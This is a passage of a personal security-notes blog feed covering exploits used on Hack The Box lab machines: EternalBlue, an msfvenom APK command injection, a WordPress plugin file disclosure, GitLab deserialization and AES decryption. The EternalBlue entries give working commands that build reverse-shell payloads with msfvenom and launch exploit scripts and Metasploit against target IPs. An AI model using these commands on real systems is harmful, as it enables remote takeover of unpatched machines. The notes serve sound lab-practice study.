class=\"o\">[</span>+] Manufacturing evil apkfile<span class=\"o\">[</span>...redacted...]<span class=\"o\">[</span>+] Done! apkfile is at /tmp/tmp9kymcdg3/evil.apk<span class=\"o\">[</span>...redacted...]➜  exploit </code></pre></div></div><ul>  <li>Open netcat listener</li>  <li>Upload APK file to web app, generate and wait for reverse connection</li></ul><p><img src=\"/spindel/assets/Android%20APK%20Command%20Injection%20via%20msfvenom%20template/F7A1C4F0-2911-4E8E-8F52-AD3D081E1FEC.png\" alt=\"\" /></p><h2 id=\"references\">References</h2><ul>  <li>HTB ScriptKiddie</li>  <li><a href=\"https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md\">advisories/2020_metasploit_msfvenom_apk_template_cmdi.md at master · justinsteven/advisories · GitHub</a></li>  <li><a href=\"https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/\">Rapid7 Metasploit Framework msfvenom APK Template Command Injection</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/21/android-apk-command-injection-via-msfvenom-template",
            
            
            
            "tags": ["linux","foothold","android"],
            
            "date_published": "2022-04-21T00:00:00+08:00",
            "date_modified": "2022-04-21T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/19/eternal-blue",
            "title": "Eternal Blue",
            "summary": "Eternal Blue",
            "content_text": "Overview  CVE-2017-0144 (Aka MS17-010)  The eternablue exploit leverages 3 bugs in SMBv1 implementaton to achieve RCE (HandlerFunction is executed which is pointed to shellcode)          Wrong casting bug      Wrong parsing function bug      Non-paged pool allocation bug      How does Eternal Blue works?Eternal Blue relies on a Windows function named srvSrvOS2FeaListSizeToNt. To see how this leads to remote code execution, let’s take a quick look at how SMB works.  Server Message Block  (SMB) operates as an application-layer network protocol mainly used for providing shared access to files, printers, serial ports and miscellaneous communications between nodes on a network.Eternal Blue exploits three bugs:The first bug is a mathematical error when the protocol tries to cast an OS/2  FileExtended Attribute (FEA)  list structure to an NT FEA structure in order to determine how much memory to allocate. A miscalculation creates an integer overflow that causes less memory to be allocated than expected, which in turns leads to a  buffer overflow . With more data than expected being written, the extra data can overflow into adjacent memory space. Triggering the buffer overflow is achieved thanks to the second bug, which results from a difference in the SMB protocol’s definition of two related sub commands: SMB_COM_TRANSACTION2 and SMB_COM_NT_TRANSACT.Both have a _SECONDARY command that is used when there is too much data to include in a single packet. The crucial difference between TRANSACTION2 and NT_TRANSACT is that the latter calls for a data packet twice the size of the former. This is significant because an error in validation occurs if the client sends a crafted message using the NT_TRANSACT sub-command immediately before the TRANSACTION2 one.While the protocol recognizes that two separate sub-commands have been received, it assigns the type and size of both packets (and allocates memory accordingly) based only on the type of the last one received. Since the last one is smaller, the first packet will occupy more space than it is allocated.Once the attackers achieve this initial overflow, they can take advantage of a third bug in SMBv1 which allows  heap spraying , a technique which results in allocating a chunk of memory at a given address. From here, the attacker can write and execute  shellcode  to take control of the system.Wireshark AnalysisAffected Versions  SMBv1  All windows versions prior Windows 8Interesting Files and Directories# list of named pipes you can use/usr/share/metasploit-framework/data/wordlists/named_pipes.txtDetection# nmapnmap -p445 --script smb-vuln-ms17-010 victim.comReferences                              [EternalBlue Exploit          MS17-010 Explained          Avast](https://www.avast.com/c-eternalblue)                      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption  HTB Blue  EternalBlue – Everything There Is To Know by Check Point Research",
            "content_html": "<h2 id=\"overview\">Overview</h2><p><img src=\"/spindel/assets/Eternal%20Blue/A066602F-25AE-4384-9BA2-438B104D581D.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Eternal%20Blue/24477296-DE05-4656-AD13-76BDC4551B8A.png\" alt=\"\" /></p><ul>  <li>CVE-2017-0144 (Aka MS17-010)</li>  <li>The eternablue exploit leverages 3 bugs in SMBv1 implementaton to achieve RCE (<code class=\"language-plaintext highlighter-rouge\">HandlerFunction</code> is executed which is pointed to shellcode)    <ul>      <li>Wrong casting bug</li>      <li>Wrong parsing function bug</li>      <li>Non-paged pool allocation bug</li>    </ul>  </li></ul><h2 id=\"how-does-eternal-blue-works\">How does Eternal Blue works?</h2><p>Eternal Blue relies on a Windows function named <code class=\"language-plaintext highlighter-rouge\">srvSrvOS2FeaListSizeToNt</code>. To see how this leads to remote code execution, let’s take a quick look at how SMB works.  <a href=\"https://en.wikipedia.org/wiki/Server_Message_Block\">Server Message Block</a>  (SMB) operates as an application-layer network protocol mainly used for providing shared access to files, printers, serial ports and miscellaneous communications between nodes on a network.</p><p>Eternal Blue exploits three bugs:</p><p>The <strong>first bug</strong> is a mathematical error when the protocol tries to cast an OS/2  <a href=\"https://en.wikipedia.org/wiki/Extended_file_attributes\">FileExtended Attribute (FEA)</a>  list structure to an NT FEA structure in order to determine how much memory to allocate. A miscalculation creates an integer overflow that causes less memory to be allocated than expected, which in turns leads to a  <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">buffer overflow</a> . With more data than expected being written, the extra data can overflow into adjacent memory space. Triggering the buffer overflow is achieved thanks to the <strong>second bug</strong>, which results from a difference in the SMB protocol’s definition of two related sub commands: <code class=\"language-plaintext highlighter-rouge\">SMB_COM_TRANSACTION2</code> and <code class=\"language-plaintext highlighter-rouge\">SMB_COM_NT_TRANSACT</code>.</p><p>Both have a <code class=\"language-plaintext highlighter-rouge\">_SECONDARY</code> command that is used when there is too much data to include in a single packet. The crucial difference between <code class=\"language-plaintext highlighter-rouge\">TRANSACTION2</code> and <code class=\"language-plaintext highlighter-rouge\">NT_TRANSACT</code> is that the latter calls for a data packet twice the size of the former. This is significant because an error in validation occurs if the client sends a crafted message using the <code class=\"language-plaintext highlighter-rouge\">NT_TRANSACT</code> sub-command immediately before the <code class=\"language-plaintext highlighter-rouge\">TRANSACTION2</code> one.</p><p>While the protocol recognizes that two separate sub-commands have been received, it assigns the type and size of both packets (and allocates memory accordingly) based only on the type of the last one received. Since the last one is smaller, the first packet will occupy more space than it is allocated.</p><p>Once the attackers achieve this initial overflow, they can take advantage of a <strong>third bug</strong> in SMBv1 which allows  <a href=\"https://andyrussellcronin.wordpress.com/2012/04/13/understanding-heap-spraying/\">heap spraying</a> , a technique which results in allocating a chunk of memory at a given address. From here, the attacker can write and execute  <a href=\"https://en.wikipedia.org/wiki/Shellcode\">shellcode</a>  to take control of the system.</p><h2 id=\"wireshark-analysis\">Wireshark Analysis</h2><p><img src=\"/spindel/assets/Eternal%20Blue/eternablue23.png\" alt=\"\" /></p><h2 id=\"affected-versions\">Affected Versions</h2><ul>  <li>SMBv1</li>  <li>All windows versions prior Windows 8</li></ul><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># list of named pipes you can use</span>/usr/share/metasploit-framework/data/wordlists/named_pipes.txt</code></pre></div></div><h2 id=\"detection\">Detection</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># nmap</span>nmap <span class=\"nt\">-p445</span> <span class=\"nt\">--script</span> smb-vuln-ms17-010 victim.com</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[EternalBlue Exploit</td>          <td>MS17-010 Explained</td>          <td>Avast](https://www.avast.com/c-eternalblue)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/\">MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</a></li>  <li>HTB Blue</li>  <li><a href=\"https://research.checkpoint.com/2017/eternalblue-everything-know/\">EternalBlue – Everything There Is To Know by Check Point Research</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/19/eternal-blue",
            
            
            
            "tags": ["windows","foothold","smb","privesc","rce"],
            
            "date_published": "2022-04-19T00:00:00+08:00",
            "date_modified": "2022-04-19T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/18/eternal-blue-exploits",
            "title": "Eternal Blue - Exploits",
            "summary": "Eternal Blue - Exploits",
            "content_text": "Double Pulsar  A sophisticated backdoor implant which serves as a loading dock for other exploits  RAM-resident implant          Removed when system is rebooted?      Once installed on victim system, it can receive additional malwares and remote commands        Can also infect RDP  Here is an example detection script42315.py  Seems not working for windows xp# Get mysmb modulewget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py# Install dependenciesvirtualenv -p py2 virtualenv_eternalbluesource virtualenv_eternalblue/bin/activatepip install impacketsearchsploit -m 42315.py# Optional - add username pass (use this if# anonymous login doesn't work)(virtualenv_eternalblue) ➜  relevant cat 42315.py| egrep '^(USER|PASS)'USERNAME = 'Bob'PASSWORD = '!P@$$W0rD!123'(virtualenv_eternalblue) ➜  relevant # Runpython 42315.py 10.10.82.5642031.py  Seems not working on windows xp  Also crashes “Windows 7 Professional 7601 Service Pack 1” (HTB Blue)# Setup similar virtualenv with 42315.pysearchsploit -m 42031.py# Update credentials(virtualenv_eternalblue) ➜  relevant cat 42031.py | grep login_standard\tconn.login_standard('Bill', 'Juw4nnaM4n420696969!$$$')(virtualenv_eternalblue) ➜  relevant# Generate shell code filemsfvenom -p windows/shell/reverse_tcp LHOST=10.11.40.33 LPORT=4444 -e x86/shikata_ga_nai -f exe -o eternalblue.exe# Runpython 42031.py 10.10.177.9 eternalblue.exe# NOTE: This doesnt work for windows server 2016Metasploit  Seems the most stable# If victim is vulnerable to ms17-010 eternalblue,# try to use metasploit. NOTE: if this fail on first# time try running it a couple more times.msf&gt; use windows/smb/ms17_010_eternalbluemsf&gt; set rhosts 10.10.10.13msf&gt; set lhost tun0msf&gt; set payload windows/x64/shell/reverse_tcpmsf&gt; run# Try upgrading to meterpreter shellsend_and_execute.py  Versions tested:          Windows 7 Professional 7601 Service Pack 1 (HTB Blue)        Get mysmb.py here  Generate payloadmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe  Open netcat listener  Run send_and_execute.py. Get it here.python send_and_execute.py legacy ms17-010.exeTroubleshooting  If you get permission errors on named pipes, try changing usernames to \\ and password blanksUSERNAME = '\\\\'PASSWORD = ''References  DoublePulsar – A Very Sophisticated Payload for Windows  Open-Source Command and Control of the DOUBLEPULSAR Implant  MS17-010 Exploits",
            "content_html": "<h2 id=\"double-pulsar\">Double Pulsar</h2><ul>  <li>A sophisticated backdoor implant which serves as a loading dock for other exploits</li>  <li>RAM-resident implant    <ul>      <li>Removed when system is rebooted?</li>      <li>Once installed on victim system, it can receive additional malwares and remote commands</li>    </ul>  </li>  <li>Can also infect RDP</li>  <li>Here is an example <a href=\"https://github.com/countercept/doublepulsar-detection-script\">detection script</a></li></ul><h2 id=\"42315py\">42315.py</h2><ul>  <li>Seems not working for windows xp</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Get mysmb module</span>wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py<span class=\"c\"># Install dependencies</span>virtualenv <span class=\"nt\">-p</span> py2 virtualenv_eternalblue<span class=\"nb\">source </span>virtualenv_eternalblue/bin/activatepip <span class=\"nb\">install </span>impacketsearchsploit <span class=\"nt\">-m</span> 42315.py<span class=\"c\"># Optional - add username pass (use this if</span><span class=\"c\"># anonymous login doesn't work)</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant <span class=\"nb\">cat </span>42315.py| egrep <span class=\"s1\">'^(USER|PASS)'</span>USERNAME <span class=\"o\">=</span> <span class=\"s1\">'Bob'</span>PASSWORD <span class=\"o\">=</span> <span class=\"s1\">'!P@$$W0rD!123'</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant <span class=\"c\"># Run</span>python 42315.py 10.10.82.56</code></pre></div></div><h2 id=\"42031py\">42031.py</h2><ul>  <li>Seems not working on windows xp</li>  <li>Also crashes “Windows 7 Professional 7601 Service Pack 1” (HTB Blue)</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Setup similar virtualenv with 42315.py</span>searchsploit <span class=\"nt\">-m</span> 42031.py<span class=\"c\"># Update credentials</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant <span class=\"nb\">cat </span>42031.py | <span class=\"nb\">grep </span>login_standard\tconn.login_standard<span class=\"o\">(</span><span class=\"s1\">'Bill'</span>, <span class=\"s1\">'Juw4nnaM4n420696969!$$$'</span><span class=\"o\">)</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant<span class=\"c\"># Generate shell code file</span>msfvenom <span class=\"nt\">-p</span> windows/shell/reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.11.40.33 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>4444 <span class=\"nt\">-e</span> x86/shikata_ga_nai <span class=\"nt\">-f</span> exe <span class=\"nt\">-o</span> eternalblue.exe<span class=\"c\"># Run</span>python 42031.py 10.10.177.9 eternalblue.exe<span class=\"c\"># NOTE: This doesnt work for windows server 2016</span></code></pre></div></div><h2 id=\"metasploit\">Metasploit</h2><ul>  <li>Seems the most stable</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># If victim is vulnerable to ms17-010 eternalblue,</span><span class=\"c\"># try to use metasploit. NOTE: if this fail on first</span><span class=\"c\"># time try running it a couple more times.</span>msf&gt; use windows/smb/ms17_010_eternalbluemsf&gt; <span class=\"nb\">set </span>rhosts 10.10.10.13msf&gt; <span class=\"nb\">set </span>lhost tun0msf&gt; <span class=\"nb\">set </span>payload windows/x64/shell/reverse_tcpmsf&gt; run<span class=\"c\"># Try upgrading to meterpreter shell</span></code></pre></div></div><h2 id=\"send_and_executepy\">send_and_execute.py</h2><ul>  <li>Versions tested:    <ul>      <li>Windows 7 Professional 7601 Service Pack 1 (HTB Blue)</li>    </ul>  </li>  <li>Get <code class=\"language-plaintext highlighter-rouge\">mysmb.py</code> <a href=\"https://github.com/worawit/MS17-010/blob/master/mysmb.py\">here</a></li>  <li>Generate payload</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>msfvenom <span class=\"nt\">-p</span> windows/shell_reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.10.14.51 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>4444 <span class=\"nv\">EXITFUNC</span><span class=\"o\">=</span>thread <span class=\"nt\">-f</span> exe <span class=\"nt\">-a</span> x86 <span class=\"nt\">--platform</span> windows <span class=\"nt\">-o</span> ms17-010.exe</code></pre></div></div><ul>  <li>Open netcat listener</li>  <li>Run <code class=\"language-plaintext highlighter-rouge\">send_and_execute.py</code>. Get it <a href=\"https://github.com/helviojunior/MS17-010\">here</a>.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python send_and_execute.py legacy ms17-010.exe</code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><ul>  <li>If you get permission errors on named pipes, try changing usernames to <code class=\"language-plaintext highlighter-rouge\">\\</code> and password blanks</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">USERNAME</span> <span class=\"o\">=</span> <span class=\"s\">'</span><span class=\"se\">\\\\</span><span class=\"s\">'</span><span class=\"n\">PASSWORD</span> <span class=\"o\">=</span> <span class=\"s\">''</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.secpod.com/blog/doublepulsar-a-very-sophisticated-payload-for-windows/\">DoublePulsar – A Very Sophisticated Payload for Windows</a></li>  <li><a href=\"https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/\">Open-Source Command and Control of the DOUBLEPULSAR Implant</a></li>  <li><a href=\"https://github.com/worawit/MS17-010\">MS17-010 Exploits</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/18/eternal-blue-exploits",
            
            
            
            "tags": ["windows","foothold","smb","privesc"],
            
            "date_published": "2022-04-18T00:00:00+08:00",
            "date_modified": "2022-04-18T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/17/wordpress-jobmanager-plugin-file-disclosure",
            "title": "Wordpress Job-Manager Plugin File Disclosure",
            "summary": "Wordpress Job-Manager Plugin File Disclosure",
            "content_text": "OverviewVulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.CVE-2015-6668Environment Setup  Wordpress running job manager plugin 0.7.25.Steps  Check what available are the available job titlesfor i in $(seq 1 25); do echo -n \"$i: \"; curl -s http://tenten/index.php/jobs/apply/$i/ | grep 'entry-title' | cut -d'&gt;' -f2 | cut -d'&lt;' -f1; done  Using this script, brute force the possible files you can retrieve from the uploads directory➜  exploit python2 brute.py/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.CVE-2015-6668Title: CV filename disclosure on Job-Manager WP PluginBlog: https://vagmour.euPlugin URL: http://www.wp-jobmanager.comVersions: &lt;=0.7.25Enter a vulnerable website: http://tentenEnter a file name: HackerAccessGranted[+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg➜  exploit References  HTB Tenten",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Vulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.</p><p>CVE-2015-6668</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Wordpress running job manager plugin 0.7.25.</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Check what available are the available job titles</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"si\">$(</span><span class=\"nb\">seq </span>1 25<span class=\"si\">)</span><span class=\"p\">;</span> <span class=\"k\">do </span><span class=\"nb\">echo</span> <span class=\"nt\">-n</span> <span class=\"s2\">\"</span><span class=\"nv\">$i</span><span class=\"s2\">: \"</span><span class=\"p\">;</span> curl <span class=\"nt\">-s</span> http://tenten/index.php/jobs/apply/<span class=\"nv\">$i</span>/ | <span class=\"nb\">grep</span> <span class=\"s1\">'entry-title'</span> | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">'&gt;'</span> <span class=\"nt\">-f2</span> | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">'&lt;'</span> <span class=\"nt\">-f1</span><span class=\"p\">;</span> <span class=\"k\">done</span></code></pre></div></div><ul>  <li>Using this <a href=\"https://github.com/1nf1n17yk1ng/CVE-2015-6668\">script</a>, brute force the possible files you can retrieve from the uploads directory</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  exploit python2 brute.py/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class=\"k\">for </span>it is now deprecated <span class=\"k\">in </span>cryptography, and will be removed <span class=\"k\">in </span>the next release.CVE-2015-6668Title: CV filename disclosure on Job-Manager WP PluginBlog: https://vagmour.euPlugin URL: http://www.wp-jobmanager.comVersions: &lt;<span class=\"o\">=</span>0.7.25Enter a vulnerable website: http://tentenEnter a file name: HackerAccessGranted<span class=\"o\">[</span>+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg➜  exploit </code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Tenten</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/17/wordpress-jobmanager-plugin-file-disclosure",
            
            
            
            "tags": ["foothold","wordpress","web"],
            
            "date_published": "2022-04-17T00:00:00+08:00",
            "date_modified": "2022-04-17T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/16/ld-preload",
            "title": "LD_PRELOAD",
            "summary": "LD_PRELOAD",
            "content_text": "Overview  Allows you to load any libraries before loading actual libraries needed by the app  Can be set via LD_PRELOAD environment variable or on /etc/ld.so.preloadTools  FatherExample exploits leveraging this technique  GNU Screen 4.5.0 - Local Privilege EscalationReferences  https://securityboulevard.com/2020/10/not-so-random-using-ld_preload-to-hijack-the-rand-function/  Linux Privilege Escalation using LD_Preload",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>Allows you to load any libraries before loading actual libraries needed by the app</li>  <li>Can be set via <code class=\"language-plaintext highlighter-rouge\">LD_PRELOAD</code> environment variable or on <code class=\"language-plaintext highlighter-rouge\">/etc/ld.so.preload</code></li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/mav8557/Father?fbclid=IwAR2_dWGrUAHhfMOtMP9ovuXw4Hp7xCdm4DHWay99AObhaG5zuCrJAsZbHjE\">Father</a></li></ul><h2 id=\"example-exploits-leveraging-this-technique\">Example exploits leveraging this technique</h2><ul>  <li><a href=\"https://www.exploit-db.com/exploits/41154\">GNU Screen 4.5.0 - Local Privilege Escalation</a></li></ul><h2 id=\"references\">References</h2><ul>  <li>https://securityboulevard.com/2020/10/not-so-random-using-ld_preload-to-hijack-the-rand-function/</li>  <li><a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/\">Linux Privilege Escalation using LD_Preload</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/16/ld-preload",
            
            
            
            "tags": ["linux","privesc"],
            
            "date_published": "2022-04-16T00:00:00+08:00",
            "date_modified": "2022-04-16T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/15/gitlab-lfi-and-cookie-deserialization",
            "title": "Gitlab LFI and Cookie Deserialization",
            "summary": "Gitlab LFI and Cookie Deserialization",
            "content_text": "OverviewAttacker can get secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml and use that to generate a shell payload that can be converted into an RCE via cookie deserailization attack.Requirements and Environment Setup  Valid accountVersions Affected  Gitlab 12.8.1Troubleshooting  Be sure to add /users/sign_in on the target url  If user has a max limit of 1 project only, this exploit is not possibleReferences  HackerOne  GitHub - leecybersec/gitlab-rce",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can get <code class=\"language-plaintext highlighter-rouge\">secret_key_base</code> from <code class=\"language-plaintext highlighter-rouge\">/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code> and use that to generate a shell payload that can be converted into an RCE via cookie deserailization attack.</p><h2 id=\"requirements-and-environment-setup\">Requirements and Environment Setup</h2><ul>  <li>Valid account</li></ul><h2 id=\"versions-affected\">Versions Affected</h2><ul>  <li>Gitlab 12.8.1</li></ul><h2 id=\"troubleshooting\">Troubleshooting</h2><ul>  <li>Be sure to add <code class=\"language-plaintext highlighter-rouge\">/users/sign_in</code> on the target url</li>  <li>If user has a max limit of 1 project only, this exploit is not possible</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://hackerone.com/reports/827052\">HackerOne</a></li>  <li><a href=\"https://github.com/leecybersec/gitlab-rce\">GitHub - leecybersec/gitlab-rce</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/15/gitlab-lfi-and-cookie-deserialization",
            
            
            
            "tags": ["git","deserial","foothold","rce","lfi"],
            
            "date_published": "2022-04-15T00:00:00+08:00",
            "date_modified": "2022-04-15T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/12/python-aes-encryption-and-decryption",
            "title": "Python AES Encryption and Decryption",
            "summary": "Python AES Encryption and Decryption",
            "content_text": "OverviewHere is an example steps on how to decrypt a file using AES by creating a decryption program based from the given encryption program.StepsIn this box, there is a mail attachment (en.py) containing parts of the code that was used to encrypt a message which is another attachment (enim_msg.txt) on the email.def encrypt(key, filename):    chunksize = 64*1024    outputFile = \"en\" + filename    filesize = str(os.path.getsize(filename)).zfill(16)    IV =Random.new().read(16)    encryptor = AES.new(key, AES.MODE_CBC, IV)    with open(filename, 'rb') as infile:        with open(outputFile, 'wb') as outfile:            outfile.write(filesize.encode('utf-8'))            outfile.write(IV)            while True:                chunk = infile.read(chunksize)                if len(chunk) == 0:                    break                elif len(chunk) % 16 != 0:                    chunk += b' ' * (16 - (len(chunk) % 16))                outfile.write(encryptor.encrypt(chunk))def getKey(password):            hasher = SHA256.new(password.encode('utf-8'))            return hasher.digest()Obviously we need to modify this code to work properly. For example, the imports are missing. But before that, I tried to inspect the other attachment on how does it look like internally. I confirmed that the content is unreadable even when viewing in xxd.$ file enim_msg.txt enim_msg.txt: data$ strings enim_msg.txt 0000000000000234YDo!$ Going back to the python code above, by doing static analysis, I can confirm that it accepts an input password, then that password is turned into a SHA256 hash, then the hashed password is used as a key for AES CBC mode. The encryption is also done in 65536 bytes chunk as per chunksize = 64*1024 and put it into a file. At the beginning of the encrypted file, the program also put first the filesize with 0 paddings and IV, not sure though what’s the purpose of this.I wanted to confirm my anlysis above so I modified the code and test by encrypting a file. The completed code now looks like:#!/usr/bin/env python3import sys, osfrom Crypto.Hash import SHA256from Crypto import Randomfrom Crypto.Cipher import AESPASSWORD = sys.argv[1]FILENAME = sys.argv[2]def encrypt(key, filename):    chunksize = 64*1024    outputFile = \"en\" + filename    filesize = str(os.path.getsize(filename)).zfill(16)    IV =Random.new().read(16)    print(IV)    encryptor = AES.new(key, AES.MODE_CBC, IV)    with open(filename, 'rb') as infile:        with open(outputFile, 'wb') as outfile:            outfile.write(filesize.encode('utf-8'))            outfile.write(IV)            while True:                chunk = infile.read(chunksize)                if len(chunk) == 0:                    break                elif len(chunk) % 16 != 0:                    chunk += b' ' * (16 - (len(chunk) % 16))                outfile.write(encryptor.encrypt(chunk))def getKey(password):            hasher = SHA256.new(password.encode('utf-8'))            return hasher.digest()encrypt(getKey(PASSWORD), FILENAME)I tried to create a test file, encrypt it using the new code, and compared the  encrypted file to the mail attachment.# create test fileecho hello &gt; test.txt# encrypt file using new code./en.py pass123 test.txt# compare encrypted file to the encrypted attachment$ strings enim_msg.txt 0000000000000234YDo!$ strings entest.txt 0000000000000006$ There is a slight difference, I only see the filesize with paddings on the strings output. But anyway, looks like we are on correct track.The next step I decided is to start building the decryption program based from the encryption program. Its almost similar to the encryption program with few differences:  Use decryptor.decrypt instead of decryptor.encrypt  I removed the writing of IV and filesize with padding on the output file  Some variable changes#!/usr/bin/env python3import sys, osfrom Crypto.Hash import SHA256from Crypto import Randomfrom Crypto.Cipher import AESPASSWORD = sys.argv[1]FILENAME = sys.argv[2]def decrypt(key, filename):  chunksize = 64*1024  outputFile = \"de\" + filename   filesize = str(os.path.getsize(filename)).zfill(16)  IV =Random.new().read(16)  decryptor = AES.new(key, AES.MODE_CBC, IV)  with open(filename, 'rb') as infile:    with open(outputFile, 'wb') as outfile:      # outfile.write(filesize.encode('utf-8'))      # outfile.write(IV)      while True:        chunk = infile.read(chunksize)        if len(chunk) == 0:            break        elif len(chunk) % 16 != 0:            chunk += b' ' * (16 - (len(chunk) % 16))        outfile.write(decryptor.decrypt(chunk))              def getKey(password):  hasher = SHA256.new(password.encode('utf-8'))  return hasher.digest()decrypt(getKey(PASSWORD), FILENAME)I tried to run this against the decrypted test file I created and I was able to get the original data.$ ./de.py pass123 entest.txt  $ cat deentest.txtk�Y���W3�B}���s�H                 {P��O*:hello          %                                                                                                  $ $ strings deentest.txt            O*:hello          $ I was able to see the original data but there is some garbage. I’m sure I needed to do some changes on the decryption program but not sure on what part.Having this problem, I tried first to use the decryption program against the encrypted attachment. Luckily, I know the password used because it was mentioned on the email body - it was same as the name of the recipient which is sahay.$ ./de.py sahay enim_msg.txt$ strings deenim_msg.txt            sLPOSGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK      $ Doing a quick look at cyberchef using magic recipe, this is what I uncovered.Better solutionI checked how different people did it. Here is from the official HTB walkthrough.References  Looks like this is the original code where the program was based on",
